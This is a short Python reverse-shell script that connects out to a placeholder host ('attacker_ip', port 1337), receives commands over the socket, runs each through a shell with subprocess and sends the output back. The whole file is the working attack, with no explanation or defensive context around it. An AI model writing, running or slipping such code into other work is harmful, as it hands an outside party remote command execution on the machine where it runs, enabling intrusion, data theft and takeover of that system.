import socket
import subprocess

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

while True:
	cmd = payload.recv(2048)
	
	cmd = cmd.decode("utf-8")
	output = subprocess.check_output(cmd, shell = True)
	
	payload.send(output)
